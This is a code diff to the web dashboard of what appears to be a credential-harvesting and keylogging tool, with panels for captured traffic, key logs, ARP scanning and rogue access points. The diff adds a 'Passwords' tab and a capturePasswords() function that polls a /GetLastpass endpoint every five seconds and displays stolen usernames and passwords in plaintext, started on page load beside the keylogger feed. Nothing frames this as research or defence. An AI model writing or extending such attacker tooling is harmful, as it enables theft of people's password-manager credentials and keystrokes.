@@ -180,6 +180,7 @@
         <!-- <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li> -->
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Overview</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
+        <li role="presentation"><a href="#LPpasswords" aria-controls="LPpasswords" role="tab" data-toggle="tab">Passwords</a></li>
         <!-- <li role="presentation"><a href="#locations" onclick="mapLoad()" aria-controls="locations" role="tab" data-toggle="tab">Locations</a></li> -->
         <!-- <li role="presentation"><a href="#ConnectWifi" aria-controls="ConnectWifi" role="tab" data-toggle="tab">1  Connect</a></li>
         <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">2 Create</a></li>
@@ -227,47 +228,15 @@
         <div role="tabpanel" class="tab-pane" id="logs">
           <div id='userLogs'></div>
         </div>
+        <div role="tabpanel" class="tab-pane" id="LPpasswords">
+          <div id='lplogs'></div>
+        </div>
         <div role="tabpanel" class="tab-pane" id="wifiRequests">
           <p>Page in place for seeing who is connected and what SSID's devices are trying to connect to. Will come in v2.0</p>
 
         </div>
-        <div role="tabpanel" class="tab-pane" id="CreateAP">
-          <div class="accesspoint">
-            <h4>Note: You will lose your internet connection when you do this. Once the new access point is up, you can connect to that and continue on this page.</h4><br>
-          Name: <input type="text" id="apname" class="btn .input-prepend" title="name for the wifi access point" placeholder="access point name">
-          connection: 
-          <div class="btn-group harList">
-                <button type="button" class="btn btn-default dropdown-toggle" id="connectionButton" data-toggle="dropdown" aria-expanded="false">
-                  Select Connection Type <span class="caret"></span>
-                </button>
-                <ul class="dropdown-menu" role="menu" id="connectiontype">
-                  <li><a href="#" id="connectiontypeEth0">eth0</a></li>
-                  <li><a href="#" id="connectiontypewlan1">wlan1</a></li>
-                </ul>
-              </div>
-          <button type="submit" class="btn" id="createaccesspoint">Create!</button>
-          </div>
 
-          <div>
-            <div id="wifiError" class="wifi">
-            </div>
-            <div if="wifiOutput" class="wifi">
-            </div>
-          </div>
-        </div>
-        <div role="tabpanel" class="tab-pane" id="ConnectWifi">
-          <div class="accesspoint">
-          SSID: <input type="text" id="wifiName" class="btn .input-prepend" title="ssid" placeholder="SSID">
-          PASSWORD: <input type="text" id="wifiPassword" class="btn .input-prepend" title="password" placeholder="p4ssw0rd">
-          <button type="submit" class="btn" id="connectoToWifi">Connect!</button>
-          </div>
-          <div>
-            <div id="wifiError" class="wifi">
-            </div>
-            <div if="wifiOutput" class="wifi">
-            </div>
-          </div>
-        </div>
+
       </div>
 
     </div>
@@ -372,7 +341,23 @@ function initHarView(){
 
 }
 
-
+function capturePasswords() {
+  $('#LPpasswords').html("")
+  $.get("/GetLastpass", function( data ) {
+    if (data === null ) {
+      return
+    }
+    console.log(data)
+    $.each(data, function(k, item) { //for each item in the data from the json
+      console.log(item)
+      var user = document.createElement("div"); //a user object for each user (userId)
+        $(user).append("username: " + item.Username + "</br>")
+        $(user).append("password: " + item.Password + "</br>")
+        $('#LPpasswords').append(user)
+    })
+    setTimeout(capturePasswords, 5000);
+  })
+}
 
 function captureKeyLogs() {
 
@@ -493,6 +478,7 @@ function arpScan() {
 $(document).ready(function() {
   
   setTimeout(captureKeyLogs, 5000);
+  setTimeout(capturePasswords, 5000);
   pingTest() //test if we have an internet connection
   console.log(spinner)
   target = document.getElementById('spinner');
